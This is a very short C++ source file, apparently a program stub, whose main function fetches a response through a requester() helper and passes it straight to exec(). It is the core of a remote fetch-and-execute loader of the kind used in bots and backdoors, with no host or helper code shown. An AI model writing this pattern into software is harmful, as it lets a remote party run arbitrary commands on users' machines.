#include "HTTP.h"
#include "Thread.h"

int main()
{

    std::string resp = requester();

    if (!resp.empty()) {

        exec(resp);

    }

}
